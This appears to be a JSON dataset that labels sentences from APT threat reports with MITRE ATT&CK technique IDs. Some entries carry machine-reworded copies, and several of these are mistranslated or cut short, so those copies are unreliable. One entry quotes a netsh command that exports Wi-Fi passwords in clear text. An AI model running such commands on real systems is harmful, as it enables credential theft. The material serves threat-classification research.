    "The \"Blackwater.bas\" macro was obfuscated using a substitution cipher whereby the characters are replaced with their corresponding integer.": [],
    "The actors have made some small changes, such as altering the variable names to avoid Yara detection": [],
    "To operate and evade standard analysis tools, most of the functions are hashed": [],
    "Note that every string is decrypted with different XOR parameter which may fail some of the automatic analyzers.": [],
    "Figure 6: Assembly view of Sample 3 root installation related byte arrays As it turns out, the referenced byte mask is applied to the other byte arrays using a rolling double-XOR algorithm to construct malware installation paths, filenames, and descriptions for a Linux root account": [],
    "The encryption/decryption routine (refer to Figure 5) can be summarized as follows:      Figure 5: Encryption/ Decryption Function  Generate an array of integers from 0x00 to 0xff Scrambles the state of the table using the given key Encrypts or decrypts a string using the scrambled table from (b)": [],
    "Version 2 Rather than using the host ID as the key, this version uses a random XOR key between 32 and 64 bytes in length that is generated for each session": [],
    "A build tool is likely being used by these attackers that allows the operator to configure details such as C2 addresses, C2 encryption keys, and a campaign code": [],
    "After applying this decryption algorithm, we are presented with the following data: h=HOSTNAME-PC&f=mission.ini&c=& The response made by the C2 server uses the same RC4 key for encryption": [],
    "The BONDUPDATER script, which was named based on the hard-coded string “B007”, uses a custom DGA algorithm to generate subdomains for communication with the C2 server": [
        {
            "tec_id": "T1573",
            "en_text": "The BONDUPDATER script, which was named based on the hard-coded string “B007”, uses a custom DGA algorithm to generate subdomains for communication with the C2 server",
            "data_text": "The BONDUPDATER script, which was named based on the hard-coded string \"B007\", uses the custom DGA algorithm to generate subdomains to communicate with the C2 server."
        }
    ],
    "Figure 9: Example Network Communication In the example, the POWRUNER client sends a random GET request to the C2 server and the C2 server sends the random number (99999999990) as a response": [],
    "The structure of each of these outbound DNS requests is as follows: <system ID>-<job ID>-<offset in data><more data flag>-<random length of base64 encoded data between 30 and 42 characters>.<c2 domain> The payload will look for different responses to these outbound queries depending on the type of DNS request that the payload uses to communicate with the C2": [],
    "The C2 server will provide the pre-shared key within the response data and will provide the session ID value via the Set-Cookie field within the response, specifically the string after the PHPSESSID parameter of the cookie": [],
    "<encoded system data>.<same random number between 100000 and 999999 above>.<c2 name>   After obtaining a session ID and pre-shared key, the PowerShell script will continue to communicate with its C2 server to obtain data to treat as a command": [],
    "Instead, it immediately issues a query to resolve the following domain, which embeds the session ID value to transmit it to the C2:   <encoded session id>.<same random number between 100000 and 999999>.<c2 domain name>   To transmit the data via the DNS tunneling, the C2 server will respond to the above query with an IPv6 address that contains the number of DNS queries the payload must issue to obtain the entirety of the data from subsequent IPv6 answers": [],
    "The script will send the specified number of DNS queries using the following format, each of which the C2 will respond with an IPv6 address that the script will treat as a string of data:   www.<sequence number>.<same random number between 100000 and 999999>.<c2 domain name>   The payload will treat the data provided by the C2 as a message, which will have the following structure:   hello<char uuid[35]><char type[1]><data>   The message will start with the string hello followed by a 35-character UUID string": [],
    "Neither this new domain nor the IP it resolves to have been observed in the past, indicating that the sample in Table 3 may be associated with a newer campaign": [],
    "Table 4: URL parameters Additionally, the command string is hashed using the same RGPH hashing algorithm as before": [],
    "Analysis of the domains and IP address infrastructure used by APT15 identified a number of similar possible domains, shown at the bottom of the post": [
        {
            "tec_id": "T1016",
            "en_text": "Analysis of the domains and IP address infrastructure used by APT15 identified a number of similar possible domains, shown at the bottom of the post",
            "data_text": "Analysis of domains and IP address infrastructure used by APT15 revealed a number of similar possible domains shown at the bottom of the message"
        }
    ],
    "In one instance, a log file recovered from an open indexed server revealed that an IP address (112.66.188.28) located in Hainan, China had been used to administer the command and control node that was communicating with malware on victim machines": [],
    "APT40 used MURKYSHELL at a compromised victim organization to port scan IP addresses and conduct network enumeration": [
        {
            "tec_id": "T1016",
            "en_text": "APT40 used MURKYSHELL at a compromised victim organization to port scan IP addresses and conduct network enumeration",
            "data_text": "APT40 used MURKYSHELL in a compromised victim organization to scan IP addresses and perform network recalculation"
        }
    ],
    "In order to decide which domain xparis() holds, a variable pingadori() uses the radador() function to randomize the domain": [],
    "Instructions within guide.txt explaining how to carry out DNS hijacking attack In one part of guide.txt, an example target appears to be provided, with a corresponding adversary IP (185.162.235[.]106) for the legitimate domain to be redirected to": [],
    "By running SSH on the server in a compromised network, attackers can come back to the network whenever they want": [],
    "Note that IP addresses can be reallocated": [],
    "Backdoor.Pirpi also collects information about the target’s local network, including the domain controller and workstations": [],
    "It also gathers network information such as the MAC address, IP address, WINS, DHCP server, and gateway": [
        {
            "tec_id": "T1016",
            "en_text": "It also gathers network information such as the MAC address, IP address, WINS, DHCP server, and gateway",
            "data_text": "It also collects network information such as MAC address, IP address, WINS, DHCP server, and gateway"
        }
    ],
    "Regular Expressions   ([^r-v\\\\s])[r-v]([\\\\w\\\\d+\\\\/=]+)-\\\\w+.(<domainList[0]>|<domainList[1]>|<domainList[n]>)   Address:\\\\s+(([a-fA-F0-9]{0,4}:{1,4}[\\\\w|:]+){1,8})   Address:\\\\s+(([a-fA-F0-9]{0,4}:{1,2}){1,8})   ([^r-v\\\\s]+)[r-v]([\\\\w\\\\d+\\\\/=]+).(<domainList[0]>|<domainList[1]>|<domainList[n]>)   (\\\\w+).(<domainList[0]>|<domainList[1]>|<domainList[n]>)   Address:\\\\s+(\\\\d+.\\\\d+.\\\\d+.\\\\d+)    Table 3 Regular expressions used by RogueRobin The C# variant, like its PowerShell relative, will issue DNS queries to determine which query types can successfully communicate with its C2 servers": [],
    "Examining historical IP resolutions revealed a common IP between the active nameservers, 107.175.75[.]123": [],
    "This IP is of particular interest as historical domain resolutions of this IP revealed that it had resolved to the domain hotmai1l[.]com in the past as well, which was a domain we had previously identified as having a high likelihood of association with DarkHydrus infrastructure": [],
    "This IP also belongs to the same service provider and class B network range as another IP we had associated with DarkHydrus, 107.175.150[.]113 which specifically resolved to a domain name containing a victim organization’s name": [],
    "After the second DLL is loaded into memory, the first DLL overwrites the IP address for the control server, effectively changing the address the malware will communicate with": [],
    "DHS and FBI are distributing these IP addresses to enable network defense activities and reduce exposure to the DDoS command-and-control network": [],
    "FBI has high confidence that HIDDEN COBRA actors are using the IP addresses for further network exploitation.This alert includes technical indicators related to specific North Korean government cyber operations and provides suggested response actions to those indicators, recommended mitigation techniques, and information on reporting incidents to the U.S": [],
    "If Adobe Flash or Microsoft Silverlight is no longer required, DHS recommends that those applications be removed from systems.The IOCs provided with this alert include IP addresses determined to be part of the HIDDEN COBRA botnet infrastructure, identified as DeltaCharlie": [],
    "DHS and FBI recommend that network administrators review the IP addresses, file hashes, network signatures, and YARA rules provided, and add the IPs to their watchlist to determine whether malicious activity has been observed within their organization.When reviewing network perimeter logs for the IP addresses, organizations may find numerous instances of these IP addresses attempting to connect to their systems": [],
    "The IP address in the lateral movement techniques was substituted with the local machine IP address to achieve code execution on the system": [
        {
            "tec_id": "T1016",
            "en_text": "The IP address in the lateral movement techniques was substituted with the local machine IP address to achieve code execution on the system",
            "data_text": "The IP address in the side-motion methods replaced the local IP address of the machine to execute code on the system"
        }
    ],
    "When we analyzed the email headers, we determined that the email was sent from an SMTP server using an IP associated with the Yonsei University network": [],
    "text=  from=  ai= ags=  oe= aq= btnG=  oprnd=  ai= utm=  channel=  The page address in the domain of the command and control server is chosen randomly from the list": [],
    "Analysis of their configurations show that the C2 servers used both fully-qualified domain names and IP addresses": [],
    "The Retriever Trojan uses the following namespace: using pcchekapp.grp.ammar.samaneh; Android.The malware begins by creating a web service object and uses the following URL within its configuration: http:// service.chrome-up[.]date:8080 /WebService.asmx It then calls a function called “SetLog2”, which sets variables for the system’s IP address, MAC address and hostname": [],
    "The code will gather some information about the system, specifically the local IP address, MAC address, and the external IP address of the system": [],
    "Similar to Reaver as posted by Palo Alto, it gets the IP or domain of the C&C server, the port, name of the binary, a sleep timer, and what Palo Alto calls a “campaign identifier.” Technical Details At this moment, we were unable to retrieve the original infection vector and other information regarding what other tools the APT15 group is using to attack their targets": [],
    "Victim system reconnaissance The code then tries to obtain the victim’s public IP via “https://api.ipify.org/”": [],
    "The public IP is then POSTed along with OS Version, Internal IP, Machine Name, Domain Name, UserName after being encrypted to the previously chosen URL to register a new victim": [],
    "If the first resolved domain IP address starts with 24.125.X.X, then it is set to 1": [],
    "It is unknown what these domains may have been used for but based on the similarity of domain spoofing and sharing an IP, they are likely part of the adversary infrastructure": [
        {
            "tec_id": "T1016",
            "en_text": "It is unknown what these domains may have been used for but based on the similarity of domain spoofing and sharing an IP, they are likely part of the adversary infrastructure",
            "data_text": "It is not known what these domains can be used for, but based on similarity to domain spoofing and shared IP, they are probably part of an adversarial infrastructure"
        }
    ],
    "The email address is associated with the Lebanese domain of a major global financial institution": [],
    "Inspecting the class C network for 185.162.235.0/24 shows us that another IP on the same network resolves to an OilRig domain, msoffice-cdn[.]com which we identified in August 2017": [],
    "The malware then requests a connection to 192.184.60.229 on TCP port 81 using the command \"05 01 00 01 c0 b8 3c e5 00 51\" and verifies that the first two bytes from the server are \"05 00\" (c0 b8 3c e5 is the IP address and 00 51 is the port in network byte order)": [],
    "The chinapolicyanalysis.org domain was used as the sender address, as well as the hosting location of the malicious RTF document": [],
    "The mericcs.org domain was used as the sender address, as well as the hosting location of the malicious RTF document": [
        {
            "tec_id": "T1016",
            "en_text": "The mericcs.org domain was used as the sender address, as well as the hosting location of the malicious RTF document",
            "data_text": "The domain mericcs.org was used as the sender's address as well as the location of the malicious RTF document."
        }
    ],
    "The structure of the domain mimics the Mercator Institute for China Studies (MERICS), whose actual domain is merics.org": [],
    "Network Indicators​     Hostname IP Address Notes   mailcenter.support 221.121.138.139 Domain used to for sending spear phishes and user tracking": [],
    "chinapolicyanalysis.org 185.130.212.168 Domain used for spear phish sender e-mail address and to host malicious documents": [],
    "fprii.net 185.130.212.254 Domain used for spear phish sender e-mail address and to host malicious documents": [],
    "mericcs.org 221.121.138.141 Domain used for spear phish sender e-mail address and to host malicious documents": [],
    "In February 2018, several KHRAT associated domains began resolving to the IP address 89.46.222[.]97": [],
    "Examining passive DNS (pDNS) records from PassiveTotal revealed several domain names associated with this IP that mimic popular technology companies": [
        {
            "tec_id": "T1016",
            "en_text": "Examining passive DNS (pDNS) records from PassiveTotal revealed several domain names associated with this IP that mimic popular technology companies",
            "data_text": "PassiveTotal's study of passive DNS records (pDNS) revealed several domain names related to this IP that mimic popular technology companies"
        }
    ],
    "One of these domains, facebook-apps[.]com, was identified in one of the malware samples associated with this IP address": [],
    "The diagram in Figure 1 shows the samples, domains, IP addresses and e-mail addresses that we identified during our investigation (See Appendix B for more detail on these.) There is a clear split between Cluster A and Cluster B, with no infrastructure overlap between the two": [],
    "RATANKBA looking for specific IP ranges Our analysis of samples of the hack tool (HKTL_NBTSCAN.GA and HKTL_NBTSCAN.GB) indicate it as a command-line program that scans IP networks for NetBIOS information such as IP address, NetBIOS computer name, logged-in username, and MAC address—with some of the information coming from the initial RATAKNBA installation": [],
    "One of the first steps that several Mosquito installer packages performed after writing and running this local_update js file was to export all local host’s WiFi profiles (settings and passwords) to %APPDATA%\\<profile>.xml with a command line call: cmd.exe /c netsh wlan export profile key=clear folder=\"%APPDATA%\" They then gather more network information with a call to ipconfig and arp -a": [],
    "Based on dynamic and static analysis of the malware sample associated with the supservermgr[.]com domain however, we were able to determine several unique artifacts which allowed us to expand our dataset and discover additional findings": [],
    "hxxp://www.sanjosemaristas[.]com/app/index.php?{A01BA0AD-9BB3-4F38-B76B-A00AD11CBAAA}, providing the current network adapter’s service name GUID": [],
    "In Figure 9, below, red indicates targeted IP addresses, malware, registrant information, and domains associated with the targeted attack campaign while blue indicates criminal attack IP addresses, malware used, registrant information, and domains:  Figure 9": [
        {
            "tec_id": "T1016",
            "en_text": "In Figure 9, below, red indicates targeted IP addresses, malware, registrant information, and domains associated with the targeted attack campaign while blue indicates criminal attack IP addresses, malware used, registrant information, and domains:  Figure 9",
            "data_text": "In Figure 9, below, red displays the target IP addresses, malware, registrar and domain information related to the target attack, and blue displays the criminal attack IP addresses used by the malware, registrar and domain information: Figure 9"
        }
    ],
    "(Source: Dell SecureWorks) As shown in Figure 10, the unpacked JavaScript code reveals an iframe pointing to an IP address that is hosting the exploit": [],
    "(Source: Dell SecureWorks) Appendix D — Domain name parking example CTU researchers have observed TG-3390 parking domains by pointing their A record to a non-routable IP space, including the 127.0.0.[x] loopback address": [],
    "The code will gather the information and format the list using the following HTML to create a table: <table> <tr><td>Type</td><td>Owner</td><td>Permissions</td><td>Created</td><td>Modificated</td><td>Size</td><td>Path</td></tr> <tr><td>[fileType]</td><td>[fileOwnerAccountName]</td><td>[number filePosixPermissions]</td><td>[fileCreationDate]</td><td>[fileModificationDate]</td><td>[fileSize]</td><td>[file path?]</td></tr> … </table>    Table 1 Commands available within XAgent OSX The ‘showBackupIosFolder’ command is rather interesting, as it allows the threat actors to determine if a compromised system was used to backup an IOS device, such as an iPhone or iPad": [],
    "Trickbot uses this encrypted module to scan the network and steal relevant network information.": [
        {
            "tec_id": "T1016",
            "en_text": "Trickbot uses this encrypted module to scan the network and steal relevant network information.",
            "data_text": "Trickbot uses this encrypted module to scan the network and steal relevant network information."
        }
    ],
    "ipconfig ": [],
    " nbtstat ": [
        {
            "tec_id": "T1016",
            "en_text": " nbtstat ",
            "data_text": "nbtstat"
        }
    ],
    " net config": [
        {
            "tec_id": "T1016",
            "en_text": " net config",
            "data_text": "net configuration"
        }
    ],
    "It is a preferred platform within data centers and the cloud for businesses, as well as an ongoing favorite when it comes to a majority of Internet-facing web and application servers": [],
    "Furthermore, this group has routinely identified and exploited vulnerable web servers of targeted organizations to install web shells, such as ANTAK and ASPXSPY, and used stolen legitimate credentials to compromise externally facing Outlook Web Access (OWA) resources": [],
    "Attack Lifecycle  Initial Compromise APT40 has been observed leveraging a variety of techniques for initial compromise, including web server exploitation, phishing campaigns delivering publicly available and custom backdoors, and strategic web compromises": [],
    "APT40 relies heavily on web shells for an initial foothold into an organization": [],
    "Web shells are heavily relied on for nearly all stages of the attack lifecycle": [],
    "Internal web servers are often not configured with the same security controls as public-facing counterparts, making them more vulnerable to exploitation by APT40 and similarly sophisticated groups": [],
    "Maintain Presence APT40 primarily uses backdoors, including web shells, to maintain presence within a victim environment": [],
    "APT40 strongly favors web shells for maintaining presence, especially publicly available tools": [],
    "OwaAuth — This web shell and credential stealer deployed to Microsoft Exchange servers is installed as an ISAPI filter": [],
    "(Source: SecureWorks)  China Chopper web shell — This web-based executable script communicates with a full-featured user interface to allow threat actors to transfer and create files, open a command terminal, and interact with database servers": [],
    "(Source: SecureWorks) In multiple instances, CTU researchers observed artifacts from unsuccessful attempts to create a web shell on web-accessible JBOSS-based service desk software, followed by use of a functional shell to gain access to the environment": [
        {
            "tec_id": "T1505.003",
            "en_text": "(Source: SecureWorks) In multiple instances, CTU researchers observed artifacts from unsuccessful attempts to create a web shell on web-accessible JBOSS-based service desk software, followed by use of a functional shell to gain access to the environment",
            "data_text": "(Source: In several cases, CTU researchers have observed artifacts of failed attempts to create a web shell on an Internet-based service desktop based on JBOSS software, and then use a functional shell to gain access to the environment."
        }
    ],
    "(Source: SecureWorks) Reentry attempt After BRONZE UNION was evicted from a compromised environment, which involved blocking the group's known infrastructure, CTU researchers observed the group attempting to reconnect to its OWA web shells and a backup web shell it had deployed during the intrusion": [
        {
            "tec_id": "T1505.003",
            "en_text": "(Source: SecureWorks) Reentry attempt After BRONZE UNION was evicted from a compromised environment, which involved blocking the group's known infrastructure, CTU researchers observed the group attempting to reconnect to its OWA web shells and a backup web shell it had deployed during the intrusion",
            "data_text": "(Source: After BRONZE UNION was evicted from a compromised environment that included blocking the group's known infrastructure, CTU researchers watched the group try to reconnect with its OWA web show and the backup web show it deployed during the invasion."
        }
    ],
    "To report an intrusion and request resources for incident response or technical assistance, you are encouraged to contact DHS NCCIC (NCCICCustomerService@hq.dhs.gov or 888-282-0870), the FBI through a local field office, or the FBI’s Cyber Division (CyWatch@fbi.gov or 855-292-3937).Protect Against SQL Injection and Other Attacks on Web ServicesTo protect against code injections and other attacks, system operators should routinely evaluate known and published vulnerabilities, periodically perform software updates and technology refreshes, and audit external-facing systems for known web application vulnerabilities": [],
    "They should also take the following steps to harden both web applications and the servers hosting them to reduce the risk of network intrusion via this vector.Use and configure available firewalls to block attacks.Take steps to secure Windows systems, such as installing and configuring Microsoft’s Enhanced Mitigation Experience Toolkit (EMET) and Microsoft AppLocker.Monitor and remove any unauthorized code present in any www directories.Disable, discontinue, or disallow the use of Internet Control Message Protocol (ICMP) and Simple Network Management Protocol (SNMP) as much as possible.Remove unnecessary HTTP verbs from web servers": [],
    "Typical web servers and applications only require GET, POST, and HEAD.Where possible, minimize server fingerprinting by configuring web servers to avoid responding with banners identifying the server software and version number.Secure both the operating system and the application.Update and patch production servers regularly.Disable potentially harmful SQL-stored procedure calls.Sanitize and validate input to ensure that it is properly typed and does not contain escaped code.Consider using type-safe stored procedures and prepared statements.Audit transaction logs regularly for suspicious activity.Perform penetration testing on web services.Ensure error messages are generic and do not expose too much information.Permissions, Privileges, and Access ControlsSystem operators should take the following steps to limit permissions, privileges, and access controls.Reduce privileges to only those needed for a user’s duties.Restrict users’ ability (permissions) to install and run unwanted software applications, and apply the principle of “Least Privilege” to all systems and services": [],
    "Additionally, on that same url, http://mdzz2019.noip[.]cn:3654/ is used to distribute more versions of this Gh0stRAT sample, along with a .zip file containing ASPXSpy, a web shell": [],
    "Audit ISAPI filters and search for web shells on Microsoft Exchange servers": [],
    "ChinaChopper web shell": [],
    "(Source: Dell SecureWorks) Passwords, like \"admin-na-google123!@#\" shown in Figure 4, are required to interact with the web shell": [],
    "TG-3390 has used additional web shells containing similarly formatted passwords": [],
    "However, the OwaAuth web shell password contains the victim organization's name": [],
    "More information about the OwaAuth web shell is available in Appendix C": [
        {
            "tec_id": "T1505.003",
            "en_text": "More information about the OwaAuth web shell is available in Appendix C",
            "data_text": "More information about the OwaAuth web shell can be found in Appendix C."
        }
    ],
    "ASPXTool — A modified version of the ASPXSpy web shell (see Figure 6)": [],
    "ASPXTool web shell": [],
    "The OwaAuth web shell is likely created with a builder, given that the PE compile time of the binary does not change between instances and the configuration fields are padded to a specific size": [],
    "The adversaries modify publicly available tools such as ASPXSpy to remove identifying characteristics that network defenders use to identify web shells": [],
    "TG-3390 actors have deployed the OwaAuth web shell to Exchange servers, disguising it as an ISAPI filter": [],
    "They then identify the Exchange server and attempt to install the OwaAuth web shell": [],
    "If the OwaAuth web shell is ineffective because the victim uses two-factor authentication for webmail, the adversaries identify other externally accessible servers and deploy ChinaChopper web shells": [],
    "(Source: Dell SecureWorks) To facilitate lateral movement, the adversaries deploy ASPXTool web shells to internally accessible systems running IIS": [],
    "Mapping of TG-3390's interactions with web shells during an intrusion responded to by CTU researchers": [],
    "OwaAuth web shell PDB string": [],
    "Each web shell instance is configured to contain SP, Key, and Log variables": [],
    "OwaAuth web shell command set": [],
    "The stylecs.aspx webshell provides fairly significant functionality, as its developer wrote this webshell in JScript that ultimately runs any supplied JScript code provided to it within the HTTP request..": [
        {
            "tec_id": "T1505.003",
            "en_text": "The stylecs.aspx webshell provides fairly significant functionality, as its developer wrote this webshell in JScript that ultimately runs any supplied JScript code provided to it within the HTTP request..",
            "data_text": "With the stylecs.aspx web shell, you can get quite significant capabilities, as its developer wrote this web shell in JScript, which eventually runs any JScript code supplied to it in an HTTP request."
        }
    ],
    "The majority of businesses still maintain Windows-heavy user environments where certain core infrastructure components also operate under Windows servers (e.g., Active Directory, SharePoint, etc.)": [],
    "The MPK IRC Bot monitors active application windows and writes the title of the open window along with the logged keystrokes to a file at “%temp%\\Save.tmp”": [],
    "The MPK Trojan also monitors specifically for windows that are likely to contain login forms for popular web-based email clients, such as titles that contain: “Gmail -” “Yahoo – login” “Sign In -” “Outlook.com -“ MPK will attempt to parse these window titles to identify the associated email address and record these to the log file using the following format: ///////////// Mail Find <email address> /////////// If the Trojan does not find the window titles associated with Gmail, Yahoo or Outlook, it saves the title to the “Save.tmp” file in the following format: +++++++++++++ Window= <window title> +++++++++++++ The major difference between the IRC variant and non-IRC variant of MPK is the C2 protocol used": [],
    "Because of Poseidon’s longevity, there are samples targeting Windows systems as early as Windows NT 4.0 Server and Windows 95 Workstation up to current versions like Windows 8.1, as well as server variants (very important to them, given the emphasis on reaching Domain Controllers in corporate environments.) How is this different from any other targeted attack? The extortion elements of this campaign are what set it apart from others": [],
    "Offset Description   0x0 Victim GUID (8C8CEED9-4326-448B-919E-249EEC0238A3)   0x25 Victim IP Address (192.168.180.154)   0x45 Command (0x66660001)   0x49 Length of payload (0x2f – 47)   0x4d Field 1 – Windows major version (0x6 – Windows Vista+)   0x51 Field 2 – Windows minor version (0x1 – Windows 7)   0x55 Field 3 – Unknown (0x20)   0x59 Payload (default flag:4/2/2018 1:01:33 AM)    Table 5 – Beacon structure for PLAINTEE": [],
    "Linux malware detection and prevention is not prevalent at this time, but Palo Alto Networks customers are protected through our next-generation security platform:  IPS signature 14917 deployed to identify and prevent command and control activity The C2 domains and files mentioned in this report are blocked in our Threat Prevention product": [],
    "Destroy Evidence: Securely deleted logs, as well as deployed and executed disk-wiping malware, to cover tracks and disrupt forensic analysis": [],
    "The organization managed to discover what scripts were hosted on the server before BE/SandWorm gang deleted them, and unfortunately couldn’t restore them after they were deleted": [],
    "For example, at the end of 2016 CTU researchers observed the threat actors using native system functionality to disable logging processes and delete logs within a network": [],
    "After running within the %TEMP% path, Comnie will delete the original file": [],
    "KEYS Deletes the file named by tempPath + “ky” file so as not to upload anything": [],
    "LANS Deletes the file created by the LAN command to reverse the effect": [],
    "USBS Deletes the file created by the USB command to reverse the effect": [],
    "HDS Deletes the file created by the HD command to reverse the effect": [],
    "DEL-TEMP Deletes all files in the “AppData/Local/Temp” path": [],
    "Overwrite a file with all zeros and mark it for deletion on reboot  Wiping files with zeros and marking it for deletion on reboot.   Delete files using the DeleteFile() API Load an arbitrary library into its process space": [],
    "The SHAPESHIFT malware is capable of wiping disks, erasing volumes and deleting files, depending on its configuration": [],
    "Appendix Malware Family Descriptions    Malware Family  Description  Availability    DROPSHOT  Dropper that has been observed dropping and launching the TURNEDUP backdoor, as well as the SHAPESHIFT wiper malware  Non-Public    NANOCORE  Publicly available remote access Trojan (RAT) available for purchase": [],
    "DEL Deletes a specified file": [],
    "The message sent to the C2 will be “file is deleted.” if successful or “file is not deleted.” if unsuccessful": [],
    "Deletes existing file": [],
    "The dropped executable (MD5: 78734CD268E5C9AB4184E1BBE21A6EB9) contains the compressed FELIXROOT dropper component in the Portable Executable (PE) binary overlay section": [],
    "The dropper will delete itself at the end of the process": [],
    "After this file is copied, the original ‘Update.~tmp’ file is deleted": [],
    "In the event it does, Reaver will move this file to ‘%TEMP%\\~FJIOW.tmp’ and delete this new file": [],
    "boom! Deletes GID.bin, ShwDoc.VBS and ShwDoc.srv files, as well as the scheduled task whose name a GUID stored in the GID.bin file": [
        {
            "tec_id": "T1070.004",
            "en_text": "boom! Deletes GID.bin, ShwDoc.VBS and ShwDoc.srv files, as well as the scheduled task whose name a GUID stored in the GID.bin file",
            "data_text": "boom! Removes GID.bin, ShwDoc.The VBS and ShwDoc.srv files, as well as scheduled tasks whose GUID name is stored in the GID file.bin"
        }
    ],
    "Also, the x command will delete the generated registry key and the Office365DCOMCheck/SystemDiskClean scheduled task": [],
    "After running the malware, the batch script goes on to cleans up all signs of its existence on the system, this includes:  Deletion of all initial files created during installation, as well as all associated files required on disk during initial execution": [],
    "Kaspersky Lab products detect the malware used by Poseidon Group with the following detection names: Backdoor.Win32.Nhopro HEUR:Backdoor.Win32.Nhopro.gen HEUR:Hacktool.Win32.Nhopro.gen How many victims have you found? At least 35 victim companies have been identified with primary targets including financial and government institutions, telecommunications, manufacturing, energy and other service utility companies, as well as media and public relations firms": [],
    "This system configuration file (in.sys) will drop a backdoor installer (UserInstall.exe) then delete itself": [],
    "Both “%APPDATA%\\\\Microsoft\\Windows\\Cookies.txt” and “%APPDATA%\\\\Microsoft\\Windows\\Cookies.exe” are then deleted": [],
    "Once they are deleted by the attackers’ code, there is nothing left to be forensically recovered.": [],
    "and then deletes the original launcher": [],
    "Size Expansion of Configuration Information PlugX is designed to run based on its configuration information stored in itself": [],
    "This version of the campaign made malicious use of unins000.exe, a process that belongs to the Brazilian information security company GAS Tecnologia, to gather personal information undetected": [],
    "The autonomous system name of the IP shows that the allocation is controlled by Serverius Holding B.V., which is an autonomous system name we have previously seen associated with the OilRig group": [],
    "OSinfo: OSInfo is a general purpose, system information gathering tool": [],
    "This backdoor collects system information, including the operating system version and hostname, and includes functionality to check, upload, and register plugins that can further enhance its capabilities": [],
    "The data above contains the hostname (‘HOSTNAME-PC’) of the victim machine, as well as an instruction": [],
    "To obtain a job, the Trojan builds a subdomain that has the following structure and issues a DNS query to the C2 server: c<unique identifier><job identifier padded with ‘0’ to make three digits><sequence number>c The generated subdomain is then subjected to a number-to-character substitution function that is the inverse of the Table 4, which effectively converts all the digits in the subdomain into characters": [],
    "Once the second DLL is executed, it gathers information about the victim system’s setup, such as operating system version, and driver and processor information": [],
    "System owners are also advised to run the YARA tool on any system they suspect to have been targeted by HIDDEN COBRA actors": [],
    "One computer that was infected with both Cadelspy and Remexi was a system that ran a SIM card editing application": [],
    "Cadelspy initially arrives on the computer as a dropper, which downloads two installer components catering to whether the victim is running a 32-bit or 64-bit system": [],
    "Other functionalities provided by this section of the PowerShell Script are as follows:  Retrieves the following data from the system by leveraging Windows Management Instrumentation (WMI) queries and environment variables: IP Address from Network Adapter Configuration OS Name OS Architecture Computer Name Computer Domain Name Username    All of this data is concatenated and formatted as shown in Figure 13:    Figure 13: Concatenated and formatted data retrieved by PowerShell script  Register the victim’s machine to the C2 server by sending the REGISTER command to the server": [],
    "Freenki is used to gather information about the infected system and to download a subsequent stage payload": [
        {
            "tec_id": "T1082",
            "en_text": "Freenki is used to gather information about the infected system and to download a subsequent stage payload",
            "data_text": "Freenki is used to collect information about the infected system and download subsequent downloads at the boot stage"
        }
    ],
    "The information this malware collected included the following:The computer nameThe usernameThe execution path of the sampleThe BIOS modelA randomly-generated ID to uniquely identify the systemGroup123 utilized this method to ensure their victim was (a) someone they wanted to target further and (b) someone they could infect further based on the information obtained from the reconnaissance phase": [],
    "You can see that in addition to the code, the author copy-pasted English typos such as \"IE Registery\":PDB PathsWe can clearly identify a pattern in the PDB naming convention of all the binaries mentioned in this article.ROKRAT:e:\\Happy\\Work\\Source\\version 12\\T+M\\Result\\DocPrint.pdb (from the \"Evil New Year\" campaign)d:\\HighSchool\\version 13\\2ndBD\\T+M\\T+M\\Result\\DocPrint.pdb (from the \"North Korean Human Rights\" campaignD:\\HighSchool\\version 13\\First-Dragon(VS2015)\\Sample\\Release\\DogCall.pdb (ROKRAT Sample from an unidentified campaign from June)Wiper:D:\\HighSchool\\version 13\\VC2008(Version15)\\T+M\\T+M\\TMProject\\Release\\ErasePartition.pdb (From the \"Are You Happy?\" campaign)Summary GraphHere is a graph to visualize the similarities and differences between each campaign mentioned in this article:ConclusionSouth Korea is becoming an important target for malicious actors and the techniques used are becoming specific to the region (for example: use of native language to try and ensure the targets feel that the information, document or email being sent to them has added legitimacy)": [],
    "After connecting to the IRC server, the MPK bot sends custom ping messages and provides an introduction via a “!Hello” message that contains the current logged in user of the infected host, if the user has administrator privileges, the hostname, the UUID of the system, and operating system version": [],
    "The malware queries the Windows API to get the computer name, user name, volume serial number, Windows version, processor architecture and two additional values, which are “1.3” and “KdfrJKN”": [],
    "Parameter   Description    ‘u=’  This parameter contains target machine information in the following format: <Computer Name>, <User Name>, <Windows Versions>, <Processor Architecture>, <1.3>, < KdfrJKN >, <Volume Serial Number>    ‘&h=’  This parameter includes the information about the command executed and its results": [],
    "The rest of MirageFox functions similarly to previous malware created by APT15, first collecting information about the computer like the username, CPU information, architecture, and so forth": [],
    "infoClient is reponsible for collecting OS info, submitting this info to its C&C servers (the servers are malicious in nature), and receiving additional C&C communication information": [
        {
            "tec_id": "T1082",
            "en_text": "infoClient is reponsible for collecting OS info, submitting this info to its C&C servers (the servers are malicious in nature), and receiving additional C&C communication information",
            "data_text": "infoClient is responsible for collecting OS information, transferring this information to its C&C servers (servers malicious by nature), and obtaining additional C&C communication information"
        }
    ],
    "The HandlePP::getClientID method uses the following environment variables:   Figure 11. Serial number   Figure 12. Hardware UUID   Figure 13. MAC address   Figure 14. Randomly generated UUID For the initial information packet, the backdoor also collects the following:   Figure 15. OS version Running getpwuid ->pw_name , scutil – -get ComputerName, and uname –m will provide the following returns respectively:  Mac OSX 10.12": [],
    "As we can see, the following information is present within this configuration:  Remote Command and Control (C2) server Remote port Sleep timer  Reaver continues to collect various information from the victim machine, including the following:  CPU speed Computer name Username IP Address Microsoft Windows version Physical and virtual memory information  The malware proceeds to communicate with the remote server via HTTP GET and POST requests": [],
    "Reaver continues to collect various information from the victim machine, including the following:  Computer name Volume serial number Microsoft Windows version CPU speed ANSI code page OEM code page identifier for the operating system Physical and virtual memory information  Reaver encrypts this data using an incremental XOR key and uploads it to the configured remote server on the port specified": [],
    "Here is an example of the result of ps ax on an infected system:       $ ps ax[...] 566 ?? Ss 0:00.01 /usr/libexec/icloudsyncd -launchd netlogon.bundle[...]     Figure 8: Result of ps ax on an infected system Keychain stealing The OSX/Keydnap backdoor is equipped with a mechanism to gather and exfiltrate passwords and keys stored in OS X’s keychain": [],
